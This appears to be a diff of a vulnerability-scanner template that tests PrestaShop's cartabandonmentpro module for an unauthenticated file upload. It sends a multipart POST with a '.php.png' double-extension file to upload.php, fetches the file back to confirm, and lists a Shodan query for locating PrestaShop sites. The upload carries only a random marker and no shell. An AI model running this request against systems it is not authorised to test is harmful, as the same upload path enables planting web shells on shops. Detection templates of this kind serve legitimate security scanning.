@@ -1,29 +1,13 @@
-flow: http(1) && http(2)
 http:
-- extractors:
-  - internal: true
-    name: matched_path
-    part: request
-    regex:
-    - \/modules\/([^\/]+)\/
-    type: regex
-  matchers:
+- matchers:
   - condition: and
     dsl:
-    - contains(content_type, "text/html")
-    - contains(body, "{{filename}}.php.png")
-    - status_code == 200
-    internal: true
+    - contains(header_2, "image/png")
+    - contains(body_1, "{{filename}}.php.png")
+    - status_code_1 == 200 && status_code_2 == 200
     type: dsl
-  payloads:
-    paths:
-    - cartabandonmentpro
-    - cartabandonmentproOld
-    - cartabandonmentpro_Old
-    - cartabandonmentpro2
-    - pscartabandonmentpro
   raw:
-  - 'POST /modules/{{paths}}/upload.php HTTP/1.1
+  - 'POST /modules/cartabandonmentpro/upload.php HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -39,7 +23,7 @@ http:
 
     <html>
 
-    <!-- {{string}} -->
+    <!-- {{title}} -->
 
     </html>
 
@@ -47,16 +31,7 @@ http:
     --xYzZY--
 
     '
-  stop-at-first-match: true
-- matchers:
-  - condition: and
-    dsl:
-    - contains(content_type, "image/png")
-    - contains(body, "{{string}}")
-    - status_code == 200
-    type: dsl
-  raw:
-  - 'GET {{matched_path}}uploads/{{filename}}.php.png HTTP/1.1
+  - 'GET /modules/cartabandonmentpro/uploads/{{filename}}.php.png HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -68,7 +43,6 @@ info:
     framework: prestashop
     max-request: 2
     product: ap_pagebuilder
-    runzero-review: REJECT/2025-11-07/excluding tag intrusive
     shodan-query: http.component:"prestashop"
     vendor: apollotheme
     verified: true
@@ -77,7 +51,7 @@ info:
   - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/
   - https://dh42.com/blog/prestashop-security/
   severity: critical
-  tags: intrusive,file-upload,cartabandonmentpro,prestashop,vuln
+  tags: intrusive,file-upload,cartabandonmentpro,prestashop
 variables:
   filename: '{{rand_base(7, "abc")}}'
-  string: '{{rand_base(7, "abc")}}'
+  title: '{{rand_base(7, "abc")}}'
